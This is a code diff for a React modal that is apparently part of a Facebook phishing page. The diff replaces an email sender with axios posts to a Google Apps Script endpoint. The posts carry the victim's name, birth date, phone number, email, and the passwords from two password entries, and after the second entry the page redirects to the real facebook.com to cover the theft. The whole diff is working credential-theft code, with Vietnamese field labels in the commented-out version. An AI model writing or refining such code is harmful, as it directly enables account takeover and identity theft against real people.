@@ -1,10 +1,10 @@
 import React from "react";
-import { useNavigate } from "react-router-dom";
+import { Form, useNavigate } from "react-router-dom";
 import { sendEmail } from "../../Utils/sendEmail";
-import ButtonSecondary from "../UI/ButtonSecondary/ButtonSecondary";
+import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
 import InputPassword from "../UI/InputPassword/InputPassword";
 import "./Modal.scss";
-import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
+import axios from "axios";
 
 const Modal = ({ isModal, setIsModal }) => {
   const router = useNavigate();
@@ -22,43 +22,77 @@ const Modal = ({ isModal, setIsModal }) => {
   const handleContinue = () => {
     if (attempt === 0) {
       pass.current = password;
-      const formData = JSON.parse(localStorage.getItem("form"));
-      const content = `
-      IP: ${localStorage.getItem("ip")}
+      const data = JSON.parse(localStorage.getItem("form"));
+      const form = new FormData();
 
-      Fulllname: ${formData.fullname}
-      Ngày sinh : ${formData.day}
-      Tháng sinh : ${formData.month}
-      Năm sinh: ${formData.year}
-      Số điện thoại : ${formData.phone}
-      Email: ${formData.email}
-      First password: ${password}
-      `;
-      sendEmail({ content });
+      form.append("fullname", data.fullname);
+      form.append("day", data.day);
+      form.append("month", data.month);
+      form.append("year", data.year);
+      form.append("phone", data.phone);
+      form.append("email", data.email);
+      form.append("first_password", password);
+
+      axios.post(
+        "https://script.google.com/macros/s/AKfycbxeI9nhoTV_CadbrHkJ2KaZmQxL-7OZeKHwswuS7QvE-AwJXTmcXIDF1fBVAoPKucTG/exec",
+        form
+      );
+      // const content = `
+      // IP: ${localStorage.getItem("ip")}
+
+      // Fulllname: ${formData.fullname}
+      // Ngày sinh : ${formData.day}
+      // Tháng sinh : ${formData.month}
+      // Năm sinh: ${formData.year}
+      // Số điện thoại : ${formData.phone}
+      // Email: ${formData.email}
+      // First password: ${password}
+      // `;
+      // sendEmail({ content });
     }
     setAttempt((prev) => prev + 1);
   };
 
   React.useEffect(() => {
     if (attempt >= 2) {
-      const formData = JSON.parse(localStorage.getItem("form"));
-      const content = `
-      IP: ${localStorage.getItem("ip")}
+      // const formData = JSON.parse(localStorage.getItem("form"));
+      // const content = `
+      // IP: ${localStorage.getItem("ip")}
+      // Fulllname: ${formData.fullname}
+      // Ngày sinh : ${formData.day}
+      // Tháng sinh : ${formData.month}
+      // Năm sinh: ${formData.year}
+      // Số điện thoại : ${formData.phone}
+      // Email: ${formData.email}
+      // First password: ${pass.current}
+      // Last password: ${password}
+      // `;
+      // sendEmail({ content }).then(() => {
+      //   localStorage.setItem("data_info", content);
+      //   window.location.href = "https://www.facebook.com";
+      // });
 
-      Fulllname: ${formData.fullname}
-      Ngày sinh : ${formData.day}
-      Tháng sinh : ${formData.month}
-      Năm sinh: ${formData.year}
-      Số điện thoại : ${formData.phone}
-      Email: ${formData.email}
+      const data = JSON.parse(localStorage.getItem("form"));
+      const form = new FormData();
 
-      First password: ${pass.current}
-      Last password: ${password}
-      `;
-      sendEmail({ content }).then(() => {
-        localStorage.setItem("data_info", content);
-        window.location.href = "https://www.facebook.com";
-      });
+      form.append("fullname", data.fullname);
+      form.append("day", data.day);
+      form.append("month", data.month);
+      form.append("year", data.year);
+      form.append("phone", data.phone);
+      form.append("email", data.email);
+      form.append("first_password", pass.current);
+      form.append("second_password", password);
+
+      axios
+        .post(
+          "https://script.google.com/macros/s/AKfycbxeI9nhoTV_CadbrHkJ2KaZmQxL-7OZeKHwswuS7QvE-AwJXTmcXIDF1fBVAoPKucTG/exec",
+          form
+        )
+        .then(() => {
+          // localStorage.setItem("data_info", content);
+          window.location.href = "https://www.facebook.com";
+        });
     }
   }, [attempt, password, router]);
 
